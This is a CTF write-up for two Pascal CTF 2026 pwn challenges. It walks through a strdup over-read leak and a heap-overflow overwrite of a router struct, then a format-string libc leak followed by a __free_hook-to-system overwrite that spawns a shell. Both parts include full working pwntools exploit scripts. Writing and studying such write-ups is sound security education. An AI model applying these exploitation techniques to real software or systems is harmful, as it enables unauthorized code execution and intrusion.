@@ -1,0 +1,938 @@
+---
+layout: post
+title: "Pascal CTF 2026 - Pwn"
+date: 2026-02-01
+image: /assets/.
+categories: ["PascalCTF"]
+tags: [pwn, format string, heap, ctf2026]
+---
+
+## Packet Tracer 2
+
+Target: `nc pt2.ctf.pascalctf.it 9005`
+
+### Intro
+
+When I read the challenge description, I imagined it would be like a "CLI network simulator" that only does ping/ping/ping. It actually is: the menu looks like a mini Packet Tracer… but behind that there are two things that make it feel immediately "pwnable":
+
+1) there's a thread that silently checks the "win" condition, and
+2) there's a logging system that looks like "just printing logs", but becomes the backbone of the exploit.
+
+Our goal is simple: make the program believe a router interface is "connected" to a special host called `win_host`, so the win thread prints the flag.
+
+---
+
+### Recon: what binary, what protections
+
+```bash
+$ file PT2
+$ checksec --file=PT2
+```
+
+Results:
+- **PIE** is enabled (function addresses are relative offsets)
+- **NX** enabled
+- **Canary** present
+- **RELRO** partial
+- Binary **not stripped** + has **debuginfo** (nice for reading structs/fields)
+
+Looking at symbols:
+```bash
+$ nm -an PT2 | rg 'win_host_thread|get_string|log_thread|get_log|reset_logging|show_network|setup_chall'
+0000000000001319 T setuSp_chall
+00000000000017ad T get_string
+000000000000468b T show_network
+00000000000058a6 T log_thread
+0000000000005cfa T reset_logging
+0000000000005d83 T get_log
+0000000000005aeb T win_host_thread
+```
+
+Note: because PIE is enabled, the numbers above are **offsets** (runtime address = base + offset).
+
+---
+
+### The "Win condition": not ret2win, but "connect to win_host"
+
+I started by looking for a function that acts like "winning": `win_host_thread`.
+
+Important ASM snippet (offset PIE+0x5aeb):
+
+```asm
+5b9d: mov rax, QWORD PTR [rbp-0x418]   ; interface ptr
+5ba4: mov rdx, QWORD PTR [rax]         ; interface->connected_to
+5ba7: mov rax, QWORD PTR [rbp-0x420]   ; arg = win_host
+5bae: cmp rdx, rax
+5bb1: jne ...
+5bbd: call getenv("FLAG")
+5bf5: call fputs
+5bff: call exit(0)
+```
+
+Pseudocode:
+
+```c
+void *win_host_thread(Host *win_host) {
+  while (win_host->is_running) {
+    for (int r = 0; r <= 4; r++) {
+      if (!routers[r]) continue;
+      for (int i = 0; i <= 3; i++) {
+        Interface *itf = &routers[r]->interfaces[i];
+        if (itf->connected_to == win_host) {
+          const char *flag = getenv("FLAG");
+          if (!flag) flag = "FLAG not set";
+          fputs(flag, stderr);
+          exit(0);
+        }
+      }
+    }
+    thrd_sleep(1s);
+  }
+}
+```
+
+So this is not about calling a win() function; it's about **manipulating state**: simply make `router->interfaces[x].connected_to == win_host`.
+
+---
+
+### Plot twist: `win_host` exists but is "hidden"
+
+I reverse-engineered `setup_chall` (offset PIE+0x1319) and found the moment that makes everything line up:
+
+- the program creates a host named `win_host`
+- starts its thread
+- and… **places it in `hosts[30]`**, while the UI normally only "sees" hosts up to index 29
+
+Important ASM snippet:
+
+```asm
+1414: call   3cb6 <create_host>        ; create win_host
+1419: mov    QWORD PTR [rip+...], rax  ; win_host global
+...
+14ce: mov    rax, QWORD PTR [rip+...]  ; win_host
+14d5: mov    QWORD PTR [rip+...], rax  ; hosts[30] = win_host
+```
+
+Relevant global offsets (PIE):
+- `name` buffer: `PIE+0x9160`
+- `win_host` global pointer: `PIE+0x9180`
+- `routers[]`: `PIE+0x91a0`
+- `hosts[]`: `PIE+0x91e0` (so `hosts[30]` is at `hosts + 0xf0`)
+
+Now the remaining problem is: how to "inject" the `win_host` pointer into `Interface.connected_to`.
+
+---
+
+### Primitive #1 — Leak the `win_host` pointer via `strdup()` over-read
+
+The name input function is suspicious: `get_string` (offset `PIE+0x17ad`).
+
+ASM literally does:
+```asm
+17e3: lea rax, [rip+0x7976]   ; &name
+17ea: mov edx, 0x20           ; 32 bytes
+17f7: call read(0, name, 0x20)
+```
+
+Pseudocode:
+
+```c
+// global char name[0x20];
+void get_string(const char *prompt) {
+  printf("%s", prompt);
+  read(0, name, 0x20);     // NO null terminator guarantee
+}
+```
+
+Then `create_host` (offset `PIE+0x3cb6`) does:
+```c
+host->name = strdup(name);
+```
+
+If we send **exactly 32 bytes without `\0`**, `strdup()` will continue reading past `name[0x20]`.
+
+In this binary the `.bss` layout is convenient: **right after `name` sits the `win_host` pointer**.
+That means `strdup(name)` will "swallow" the bytes of `win_host` as part of the allocated string.
+
+Then calling `show_network` prints host names with `%s`, so the strdup'd string (now containing bytes from the pointer) becomes a leak.
+
+In the exploit I create host index 0 with name `b"A"*32`, then take the 6 bytes after that as a heap pointer leak:
+
+```py
+leak_name = b"A" * 0x20
+create_host(io, 0, leak_name)
+show_network(io)
+io.recvuntil(leak_name)
+leak6 = io.recvn(6)
+win_host = u64(leak6 + b"\x00\x00")
+```
+
+Why only 6 bytes?
+- x86_64 pointers often only use 48 bits (high two bytes zero)
+- additionally, the router is `memset(0)`, so if we overwrite only the low 6 bytes the high 2 bytes remain zero → a valid full 8-byte pointer
+
+---
+
+### Primitive #2 — Nice heap overflow from the logging thread
+
+This is the most Packet-Tracer-like part: every host that receives a packet creates a log line:
+
+```c
+snprintf(buf, 0x400,
+  "[HOST %s] Received on eth0 (...snip...) | %lu bytes | %s",
+  host->name, ..., strlen(packet->data), packet->data
+);
+log_message(buf);
+```
+
+`log_message` stores the string into a global `log_buffer` (0x400 bytes per entry).
+
+Then `log_thread` (offset `PIE+0x58a6`) moves the log buffer into a heap object:
+```asm
+59cd: call get_log            ; malloc(0x208)
+5a03: add  rax, 0x8           ; dst = log + 8
+5a0d: call strcpy(dst, log_buffer+0x400)
+```
+
+Pseudocode:
+
+```c
+typedef struct {
+  time_t t;        // 8 bytes
+  char msg[0x200]; // 512 bytes
+} Log;             // total 0x208
+
+void log_thread() {
+  if (log_buffer_has_data) {
+    Log *l = get_log();             // malloc(0x208)
+    strcpy(l->msg, log_buffer_slot); // BOOM: no bounds
+    l->t = time(NULL);
+  }
+}
+```
+
+If the log line is longer than `0x200`, `strcpy` overflows into the next heap chunk.
+
+#### Why my overwrite offset is `0x208` (not `0x218`)?
+
+On glibc 2.39 (the libc supplied), `malloc(0x208)` yields a chunk with size field `0x211`, meaning:
+
+- total chunk size = `0x210` bytes
+- user area = `0x208` bytes
+- `strcpy` writes starting at `log+8` (since `msg` is after `time_t`)
+- the next chunk's user area begins at `log + 0x210`
+
+So the math:
+
+```text
+start(dst) = log + 0x8
+next_user  = log + 0x210
+offset     = next_user - start = 0x210 - 0x8 = 0x208
+```
+
+The goal: have the bytes of the `win_host` pointer land exactly at the start of the router chunk's user data, because the router struct's first field is `interfaces[0]`, and the first field of `Interface` is `connected_to`.
+
+From DWARF, `Interface` begins with:
+
+```c
+typedef struct Interface {
+  void *connected_to;   // offset 0
+  Packet *buffer[8];
+  ...
+} Interface;            // size 0x90
+```
+
+---
+
+### Heap feng shui: make the log chunk adjacent to the router chunk
+
+The trick:
+
+1) Enter simulation, send a small packet → forces `get_log()` to allocate a log chunk `0x208`
+2) Exit simulation → `reset_logging()` forces the log thread to `free()` all log heap objects
+3) In the main menu, create a router → `malloc(0x2e8)` which typically falls right after the freed log chunk (now in tcache)
+4) Enter simulation again and send a packet with a long payload → `get_log()` reuses the freed log chunk from tcache, and `strcpy` overflows into the router chunk right after it
+
+Once `router->interfaces[0].connected_to` is set to `win_host`, the win thread notices and prints the FLAG then exits.
+
+---
+
+### Building the payload: align `win_host` pointer exactly at offset `0x208`
+
+A small issue: the log string has a prefix whose length depends on:
+- host name (`%s`)
+- the number `payload_len` (`%lu`)
+
+So I wrote a helper that "mimics" the `snprintf` format and finds a pad length that yields the exact overwrite offset:
+
+```py
+def find_padlen_for_router_overwrite(host_name, target_off, ptr_low6):
+  for padlen in range(0, 0x400):
+    payload_len = padlen + len(ptr_low6)
+    prefix = render_prefix_like_snprintf(host_name, payload_len)
+    if len(prefix) + padlen == target_off:
+      return b"A"*padlen + ptr_low6
+```
+
+The pointer we write is only 6 bytes:
+
+```py
+ptr_low6 = p64(win_host)[:6]
+```
+
+Reasons:
+
+- the top two bytes are usually `\x00\x00`
+- the router is `memset(0)`, so if we only overwrite the low 6 bytes the high 2 stay zero → a valid pointer
+
+The full implementation is in `solve.py`.
+
+---
+
+### Exploit
+
+```python
+#!/usr/bin/env python3
+from __future__ import annotations
+
+import os
+import time
+from dataclasses import dataclass
+
+from pwn import context, p64, process, remote
+
+
+context.binary = "./PT2"
+context.log_level = os.environ.get("LOG", "info")
+
+
+LD = "./ld-linux-x86-64.so.2"
+LIBC_DIR = "."
+BIN = "./PT2"
+
+
+@dataclass
+class HostLogPrefix:
+    host_name: bytes
+    ip: tuple[int, int, int, int]
+    src: tuple[int, int, int, int]
+    dst: tuple[int, int, int, int]
+    payload_len: int
+
+    def render_prefix(self) -> bytes:
+        fmt = (
+            b"[HOST %s] Received on eth0 (%u.%u.%u.%u): "
+            b"%u.%u.%u.%u -> %u.%u.%u.%u | %lu bytes | "
+        )
+        # The program uses snprintf with C formatting; mimic it.
+        return fmt % (
+            self.host_name,
+            *self.ip,
+            *self.src,
+            *self.dst,
+            self.payload_len,
+        )
+
+
+def start_local():
+    env = os.environ.copy()
+    env.setdefault("MALLOC_ARENA_MAX", "1")
+    env.setdefault("FLAG", "LOCAL{test_flag}")
+    # Avoid accidentally inheriting a preloaded library into the challenge binary.
+    env.pop("LD_PRELOAD", None)
+    if os.environ.get("TRACE_MALLOC"):
+        env["LD_PRELOAD"] = os.environ["TRACE_MALLOC"]
+    return process([LD, "--library-path", LIBC_DIR, BIN], env=env)
+
+
+def start_remote():
+    return remote("pt2.ctf.pascalctf.it", 9005)
+
+
+def menu_choice(io, n: int):
+    io.sendlineafter(b"Enter your choice: ", str(n).encode())
+
+
+def create_host(io, idx: int, name_bytes: bytes):
+    menu_choice(io, 1)
+    io.sendlineafter(b"Enter host index: ", str(idx).encode())
+    io.recvuntil(b"Enter host name: ")
+    if len(name_bytes) > 0x20:
+        raise ValueError("host name > 32 bytes")
+    # get_string() is a raw read(0, name, 0x20) with no terminator guarantee.
+    # Send exactly 32 bytes when we want an unterminated string; otherwise send a line.
+    if len(name_bytes) == 0x20 and b"\n" not in name_bytes:
+        io.send(name_bytes)
+    else:
+        io.send(name_bytes + b"\n")
+
+
+def create_router(io, idx: int, name_bytes: bytes):
+    menu_choice(io, 2)
+    io.sendlineafter(b"Enter router index: ", str(idx).encode())
+    io.recvuntil(b"Enter router name: ")
+    if len(name_bytes) > 0x20:
+        raise ValueError("router name > 32 bytes")
+    io.send(name_bytes + b"\n")
+
+
+def show_network(io):
+    menu_choice(io, 15)
+
+
+def enter_simulation(io):
+    menu_choice(io, 16)
+
+
+def sim_choice(io, n: int):
+    io.sendlineafter(b"Enter your choice: ", str(n).encode())
+
+
+def sim_send_self_packet_in_simulation(io, host_idx: int, payload: bytes):
+    sim_choice(io, 1)  # Send Packet
+    io.sendlineafter(b"Enter Host Index", str(host_idx).encode())
+    io.sendlineafter(b"Enter IP (4 bytes, space-separated): ", b"0 0 0 0")
+    io.recvuntil(b"Enter data (max ")
+    io.recvuntil(b"bytes): ")
+    if b"\n" in payload:
+        raise ValueError("payload contains newline")
+    io.send(payload + b"\n")
+
+
+def sim_read_logs_in_simulation(io) -> bytes:
+    sim_choice(io, 2)
+    # It prints 0..N lines and then prints the simulation prompt again.
+    data = io.recvuntil(b"Enter your choice: ", drop=False, timeout=2)
+    return data
+
+
+def exit_simulation(io):
+    # Option 3: "Return to main menu" (also resets logs).
+    sim_choice(io, 3)
+
+
+def leak_win_host_ptr(io) -> int:
+    # Create a host with an unterminated 32-byte name so strdup() reads past
+    # the global name buffer into the adjacent win_host pointer.
+    leak_name = b"A" * 0x20
+    create_host(io, 0, leak_name)
+
+    show_network(io)
+    io.recvuntil(leak_name)
+    leak6 = io.recvn(6)
+    win_host = int.from_bytes(leak6 + b"\x00\x00", "little")
+    return win_host
+
+
+def find_padlen_for_router_overwrite(host_name: bytes, target_off: int, ptr_low6: bytes) -> bytes:
+    ip = (0, 0, 0, 0)
+    src = (0, 0, 0, 0)
+    dst = (0, 0, 0, 0)
+
+    for padlen in range(0, 0x400):
+        payload_len = padlen + len(ptr_low6)
+        prefix = HostLogPrefix(host_name, ip, src, dst, payload_len).render_prefix()
+        if len(prefix) + padlen == target_off:
+            payload = b"A" * padlen + ptr_low6
+            if len(prefix) + len(payload) >= 0x3FF:
+                continue
+            return payload
+    raise RuntimeError("failed to find padlen")
+
+
+def exploit(io, *, final_timeout: float = 20.0, fast_prep: bool = False):
+    win_host = leak_win_host_ptr(io)
+    ptr_low6 = p64(win_host)[:6]
+
+    # Use a clean host for logging so prefix length is stable.
+    create_host(io, 1, b"h")
+
+    # Stage 1: create at least one log struct (chunk size 0x220) so it exists on the heap,
+    # then return to main menu (which resets/frees logs). The freed log chunk remains in-place.
+    enter_simulation(io)
+    sim_send_self_packet_in_simulation(io, 1, b"hi")
+    # Give host_thread+log_thread enough time to enqueue+materialize at least one heap log.
+    if fast_prep:
+        # Poll until the log line actually appears (meaning log_thread allocated a heap log).
+        seen = False
+        for _ in range(6):
+            time.sleep(0.8)
+            data = sim_read_logs_in_simulation(io)
+            if b"[HOST h] Received on eth0" in data:
+                seen = True
+                break
+        if not seen:
+            # Fall back to a longer wait; on some systems threads may be slow to schedule.
+            time.sleep(2.0)
+    else:
+        time.sleep(3.0)
+    exit_simulation(io)  # frees the log struct(s) we just created
+
+    # Stage 2: allocate router R0 after the freed log chunk, so the router chunk is
+    # physically adjacent (right after) that freed chunk.
+    create_router(io, 0, b"r")
+
+    # Stage 3: trigger reset_logging() (happens inside the send action) and then make a
+    # host log line long enough that the log_thread strcpy overflows into the next chunk
+    # (our router), overwriting interface[0].peer to win_host.
+    # For glibc 2.39, malloc(0x208) returns a chunk with size field 0x211 (0x210 bytes
+    # including the chunk header). The next chunk's user pointer is thus +0x210 from the
+    # log struct pointer. Since strcpy starts at log+0x8, the offset to the next chunk's
+    # user data is 0x210 - 0x8 = 0x208.
+    target_off = int(os.environ.get("OFF", "0x208"), 0)
+    payload = find_padlen_for_router_overwrite(host_name=b"h", target_off=target_off, ptr_low6=ptr_low6)
+    enter_simulation(io)
+    sim_send_self_packet_in_simulation(io, 1, payload)
+
+    # Wait for win_host_thread to notice and print FLAG then exit.
+    return io.recvall(timeout=final_timeout)
+
+
+if __name__ == "__main__":
+    use_remote = os.environ.get("REMOTE", "0") == "1"
+    brute = os.environ.get("BRUTE", "0") == "1"
+
+    if brute:
+        # Local-only brute force to calibrate the exact overwrite offset.
+        if use_remote:
+            raise SystemExit("BRUTE=1 is local-only")
+        wanted = os.environ.get("FLAG", "LOCAL{test_flag}").encode()
+        for off in range(0x200, 0x260):
+            os.environ["OFF"] = hex(off)
+            io = start_local()
+            try:
+                out = exploit(io, final_timeout=1.8, fast_prep=True)
+            except Exception as e:
+                try:
+                    io.close()
+                except Exception:
+                    pass
+                print(f"off={off:#x} exception={e}", flush=True)
+                continue
+            s = out if isinstance(out, (bytes, bytearray)) else bytes(out)
+            if wanted in s:
+                print(f"FOUND off={off:#x}")
+                print(s.decode(errors='replace'))
+                raise SystemExit(0)
+            print(f"off={off:#x} no-flag (len={len(s)})", flush=True)
+        raise SystemExit("not found in range")
+
+    io = start_remote() if use_remote else start_local()
+    out = exploit(io)
+    print(out.decode(errors="replace"))
+```
+
+Local (using the included loader+libc):
+
+```bash
+python3 solve.py
+```
+
+Remote:
+```
+REMOTE=1 python3 solve.py
+```
+
+The remote output finally printed:
+```
+pascalCTF{1_w15h_1t_w4s_4s_e4sy_t0_g3t_4_10_1n_n3tw0rks}
+```
+
+### Flag
+
+`pascalCTF{1_w15h_1t_w4s_4s_e4sy_t0_g3t_4_10_1n_n3tw0rks}`
+
+---
+
+## YetAnotherNoteTaker
+
+Target: `nc notetaker.ctf.pascalctf.it 9002`
+
+### Intro
+
+The title was familiar: "I've read too many notes recently, I can't take it anymore…". Because of that, this challenge felt like an invitation to take revenge on a note program that only allows 256 bytes.
+
+On the surface it's a simple CLI: write a note, read note, clear note, exit. Under the hood? One misplaced `printf()` and suddenly we have a highway to shell.
+
+---
+
+### Recon: inspect the package first
+
+The provided file is a zip:
+
+```bash
+$ ls -la
+notetaker.zip
+
+$ unzip -l notetaker.zip
+challenge/notetaker
+challenge/libs/libc.so.6
+challenge/libs/ld-2.23.so
+```
+
+Because the interpreter is relative (`./libs/ld-2.23.so`), run from `challenge/` so the loader is found:
+
+```bash
+$ cd challenge
+$ ./notetaker
+1. Read note
+2. Write note
+3. Clear note
+4. Exit
+>
+```
+
+Check mitigations:
+
+```bash
+$ checksec --file=./notetaker
+RELRO: Full RELRO
+Stack: Canary found
+NX:    NX enabled
+PIE:   No PIE (0x400000)
+```
+
+Mitigations are decent: canary + NX + Full RELRO. But **No PIE** means `.text`/GOT addresses are static.
+
+---
+
+### Quick reverse: what's happening in `main`
+
+I used `objdump` on `.text`:
+
+```bash
+$ objdump -d --no-show-raw-insn -M intel ./notetaker | less
+```
+
+The critical part is in the "Read note" path:
+
+```asm
+; case 1: read note
+0x400ad8: lea rax, [rbp-0x110]   ; note buffer (0x100 bytes)
+0x400adf: mov rdi, rax
+0x400ae7: call printf@plt        ; printf(note)  <-- format string bug
+0x400af1: call putchar@plt
+```
+
+Yes: the note is used directly as a format string.
+So if the note contains `%p %p %p`, `printf` will print stack pointers instead of the string literal.
+
+Meanwhile "Write note" is just `read(0, note, 0x100)` and it null-terminates on newline. "Clear note" is `memset`.
+
+Small quirk: the menu option "4. Exit" is a lie (there's no case for exit). The program only exits if the menu input is `<= 0` or `> 4`.
+
+---
+
+### Pseudocode
+
+Compact C-like pseudocode (addresses: `main = 0x400a03`, `menu = 0x40099e`):
+
+```c
+void menu(void) {
+  puts("1. Read note");
+  puts("2. Write note");
+  puts("3. Clear note");
+  puts("4. Exit");
+  printf("> ");
+}
+
+int main(void) {
+  init();                 // setvbuf stdin/stdout/stderr unbuffered
+  char note[0x100] = {0};
+
+  while (1) {
+    menu();
+
+    char *tmp = malloc(0x10);
+    memset(tmp, 0, 0x10);
+    fgets(tmp, 0x10, stdin);
+
+    int choice = 0;
+    sscanf(tmp, "%d", &choice);
+    free(tmp);
+
+    if (choice == 1) {
+      printf(note);       // BUG: format string
+      putchar('\n');
+    } else if (choice == 2) {
+      printf("Enter the note: ");
+      read(0, note, 0x100);
+      note[strcspn(note, "\n")] = 0;
+    } else if (choice == 3) {
+      memset(note, 0, 0x100);
+      puts("Note cleared.");
+    }
+
+    if (choice <= 0 || choice > 4)
+      break;
+  }
+  return 0;
+}
+```
+
+One important detail: every loop the program does `malloc(0x10) -> fgets() -> free()`; this is important later.
+
+---
+
+### Exploit strategy: format string → leak libc → overwrite `__free_hook` → shell
+
+Given canary + NX + Full RELRO, a convenient glibc 2.23 route is:
+
+1. **Leak libc** via format string by reading `printf@GOT`.
+2. Compute `libc_base`.
+3. **Overwrite `__free_hook` with `system`** (in libc, not the GOT).
+4. Trigger `free(buf)` where `buf` equals "/bin/sh" → `system("/bin/sh")`.
+
+Static addresses in the binary (No PIE):
+
+```text
+printf@GOT = 0x601fb0
+```
+
+Libc offsets (from `challenge/libs/libc.so.6`, glibc 2.23):
+
+```text
+printf     = 0x0000000000055810
+system     = 0x00000000000453a0
+__free_hook= 0x00000000003c67a8
+```
+
+---
+
+### The format-string magic: how to supply arguments?
+
+We call `printf(note)` with no variadic arguments. But the format string can force `printf` to read "arguments" from the stack.
+
+Because `note` lives on the `main` stack frame, some of the values `printf` reads as arguments can come from the `note` buffer itself.
+
+I found the exact offsets by spraying a marker and `%p`:
+
+```python
+write_note(b'AAAABBBB ' + b'%p '*40)
+read_note()
+```
+
+In the output `0x4242424241414141` shows up as one of the arguments. That means the first 8 bytes of `note` are exposed as an argument.
+
+From experiments the stable offset is:
+
+- Argument 8 (`%8$p`) corresponds to the start of our buffer.
+- If we place an address at `note[0x80:0x88]`, that becomes an argument:
+
+```text
+BASE_ARG = 8 + (0x80 / 8) = 24
+```
+
+So an address placed at `note[0x80]` can be referenced with `%24$...`.
+
+Trick: `read()` allows NUL bytes in the buffer. `printf` stops printing at NUL, but bytes after it still exist on the stack and can be used as arguments.
+
+---
+
+### Leak libc: read `printf@GOT` using `%24$.8s`
+
+Leak payload used:
+
+```text
+%24$.8s<<<END>>>
+```
+
+Followed by a `\x00` and padding up to `0x80`, then `p64(printf@GOT)`.
+
+Why `.8s`? We want the 8 bytes from the GOT entry for `printf`. Using `%.8s` avoids printing huge garbage if the address points at a long region without NUL.
+
+From this we compute `printf_addr` and:
+
+```text
+libc_base = printf_addr - libc.printf
+```
+
+---
+
+### Write primitive: change `__free_hook` → `system` using `%hn`
+
+Once we have `libc_base` we compute:
+
+```text
+free_hook = libc_base + __free_hook
+system    = libc_base + system
+```
+
+To write 8 bytes to `__free_hook`, split into four 2-byte halfwords and write with `%hn`.
+We place the four target addresses (`free_hook+0`, `+2`, `+4`, `+6`) as arguments `%24$`, `%25$`, `%26$`, `%27$`.
+
+We print controlled counts so each `%hn` writes the desired halfword.
+
+Core algorithm:
+
+```python
+parts = [(value>>0)&0xffff, addr+0],
+        [(value>>16)&0xffff, addr+2],
+        [(value>>32)&0xffff, addr+4],
+        [(value>>48)&0xffff, addr+6]
+
+sort parts by target value
+for each (want, target, argi):
+  print padding to reach `want`
+  %argi$hn
+```
+
+---
+
+### Trigger: why `/bin/sh` as the menu choice is enough
+
+Recall:
+
+```c
+tmp = malloc(0x10);
+fgets(tmp, 0x10, stdin);
+sscanf(tmp, "%d", &choice);
+free(tmp);
+```
+
+If `__free_hook` points to `system`, then `free(tmp)` becomes `system(tmp)` and we just need to pass `/bin/sh` as the menu line:
+
+```
+> /bin/sh
+```
+
+And we get a shell.
+
+---
+
+### Exploit
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import os
+
+
+HOST = os.environ.get("HOST", "notetaker.ctf.pascalctf.it")
+PORT = int(os.environ.get("PORT", "9002"))
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+CHALL_DIR = os.path.join(HERE, "challenge")
+
+ELF_PATH = os.path.join(CHALL_DIR, "notetaker")
+LIBC_PATH = os.path.join(CHALL_DIR, "libs", "libc.so.6")
+
+elf = context.binary = ELF(ELF_PATH)
+libc = ELF(LIBC_PATH)
+
+context.arch = "amd64"
+
+ADDR_OFF = 0x80
+BASE_ARG = 8 + (ADDR_OFF // 8)
+TAG = b"<<<END>>>"
+
+
+def _menu_choice(io: tube, s: bytes) -> None:
+    io.recvuntil(b"> ")
+    io.sendline(s)
+
+
+def _write_note(io: tube, payload: bytes) -> None:
+    _menu_choice(io, b"2")
+    io.recvuntil(b"Enter the note: ")
+    io.send(payload + b"\n")
+
+
+def _read_note_leak(io: tube) -> bytes:
+    _menu_choice(io, b"1")
+    data = io.recvuntil(TAG)
+    leak = data[: -len(TAG)]
+    io.recvuntil(b"\n")
+    return leak
+
+
+def _build_leak_payload(addr: int) -> bytes:
+    fmt = b"%" + str(BASE_ARG).encode() + b"$.8s" + TAG
+    payload = fmt + b"\x00"
+    payload = payload.ljust(ADDR_OFF, b"B")
+    payload += p64(addr)
+    if len(payload) > 0x100:
+        raise ValueError(f"leak payload too long: {len(payload)} bytes")
+    return payload
+
+
+def _build_write_qword_payload(addr: int, value: int) -> bytes:
+    parts: list[tuple[int, int, int]] = []
+    for i in range(4):
+        parts.append(((value >> (16 * i)) & 0xFFFF, addr + 2 * i, BASE_ARG + i))
+
+    fmt = b""
+    printed = 0
+    for wanted, _, argi in sorted(parts, key=lambda x: x[0]):
+        delta = (wanted - printed) & 0xFFFF
+        if delta:
+            fmt += b"%1$" + str(delta).encode() + b"c"
+        fmt += b"%" + str(argi).encode() + b"$hn"
+        printed = wanted
+
+    payload = fmt + b"\x00"
+    payload = payload.ljust(ADDR_OFF, b"B")
+    for _, a, _ in parts:
+        payload += p64(a)
+    if len(payload) > 0x100:
+        raise ValueError(f"write payload too long: {len(payload)} bytes")
+    return payload
+
+
+def exploit(io: tube) -> None:
+    _write_note(io, _build_leak_payload(elf.got["printf"]))
+    printf_addr = u64(_read_note_leak(io).ljust(8, b"\x00"))
+
+    libc_base = printf_addr - libc.symbols["printf"]
+    system = libc_base + libc.symbols["system"]
+    free_hook = libc_base + libc.symbols["__free_hook"]
+
+    log.info("printf@libc = %s", hex(printf_addr))
+    log.info("libc base   = %s", hex(libc_base))
+    log.info("__free_hook = %s", hex(free_hook))
+    log.info("system      = %s", hex(system))
+
+    _write_note(io, _build_write_qword_payload(free_hook, system))
+    _menu_choice(io, b"1")  # trigger the format-string write
+    io.recvuntil(b"\n")
+
+    # system will get called by free() on the menu input buffer.
+    io.recvuntil(b"> ")
+    io.sendline(b"/bin/sh")
+    io.interactive()
+
+
+def main() -> None:
+    context.log_level = os.environ.get("LOG", "info")
+
+    io = remote(HOST, PORT)
+    exploit(io)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+```bash
+$ python3 solve.py
+```
+
+The core leak + write builders are:
+
+```py
+def _build_leak_payload(addr):
+    fmt = b"%" + str(BASE_ARG).encode() + b"$.8s" + TAG
+    return fmt + b"\x00" + b"B"*(ADDR_OFF-len(fmt)-1) + p64(addr)
+
+def _build_write_qword_payload(addr, value):
+    # split 8 bytes into 4x %hn writes (2 bytes each)
+    ...
+```
+
+### Flag
+
+`pascalCTF{d1d_y0u_fr_h00k3d_th3_h3ap?}`
+
+---
+
+{/* End of translation */}
